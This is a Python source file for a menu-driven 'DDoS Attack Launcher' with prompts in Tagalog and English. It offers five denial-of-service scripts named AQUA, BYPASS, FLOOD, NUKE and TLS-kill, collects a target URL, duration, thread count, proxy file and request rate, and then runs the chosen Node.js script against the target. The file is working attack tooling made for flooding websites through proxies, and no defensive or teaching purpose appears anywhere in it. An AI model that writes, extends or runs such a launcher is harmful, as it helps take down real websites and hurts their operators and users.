import subprocess
import sys
import os

# List of attack scripts and their command-line usage
ATTACKS = {
    '1': {
        'name': 'AQUA',
        'file': 'AQUA.js',
        'usage': 'node AQUA.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]'
    },
    '2': {
        'name': 'BYPASS',
        'file': 'BYPASS.js',
        'usage': 'node BYPASS.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]'
    },
    '3': {
        'name': 'FLOOD',
        'file': 'FLOOD.js',
        'usage': 'node FLOOD.js [TARGET] [TIME] [THREAD] [PROXY FILE] [RPS]'
    },
    '4': {
        'name': 'NUKE',
        'file': 'NUKE.js',
        'usage': 'node NUKE.js [TARGET] [TIME] [THREAD] [PROXY FILE] [RPS]'
    },
    '5': {
        'name': 'TLS-kill',
        'file': 'TLS-kill.js',
        'usage': 'node TLS-kill.js [TARGET] [TIME] [THREAD] [PROXY FILE]'
    },
}

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    while True:
        clear()
        print('==============================')
        print('   DDoS Attack Launcher v1.0   ')
        print('==============================')
        print('Pili ka ng attack method:')
        for key, atk in ATTACKS.items():
            print(f"  {key}. {atk['name']} ({atk['file']})")
        print('  0. Exit')
        choice = input('\nIlagay ang number ng attack method: ').strip()
        if choice == '0':
            print('Salamat! Exiting...')
            sys.exit(0)
        if choice not in ATTACKS:
            print('Invalid choice. Try ulit.\n')
            input('Press Enter to continue...')
            continue
        attack = ATTACKS[choice]
        print(f"\nNapili mo: {attack['name']}\nUsage: {attack['usage']}")
        # Collect parameters
        params = []
        if attack['name'] in ['AQUA', 'BYPASS']:
            params.append(input('TARGET (hal. https://site.com): ').strip())
            params.append(input('TIME (seconds): ').strip())
            params.append(input('REQUESTS per second: ').strip())
            params.append(input('THREADS: ').strip())
            params.append(input('PROXY FILE (hal. proxy.txt): ').strip())
        elif attack['name'] in ['FLOOD', 'NUKE']:
            params.append(input('TARGET (hal. https://site.com): ').strip())
            params.append(input('TIME (seconds): ').strip())
            params.append(input('THREADS: ').strip())
            params.append(input('PROXY FILE (hal. proxy.txt): ').strip())
            params.append(input('RPS (requests per second): ').strip())
        elif attack['name'] == 'TLS-kill':
            params.append(input('TARGET (hal. https://site.com): ').strip())
            params.append(input('TIME (seconds): ').strip())
            params.append(input('THREADS: ').strip())
            params.append(input('PROXY FILE (hal. proxy.txt): ').strip())
        else:
            print('Unknown attack type. Exiting...')
            sys.exit(1)
        # Build command
        cmd = ['node', attack['file']] + params
        print(f"\nRunning: {' '.join(cmd)}\n")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout:
                print(line, end='')
            proc.wait()
            print(f"\nAttack finished with exit code {proc.returncode}.")
        except Exception as e:
            print(f"\nError running attack: {e}")
        input('\nPress Enter to return to menu...')

if __name__ == '__main__':
    main() 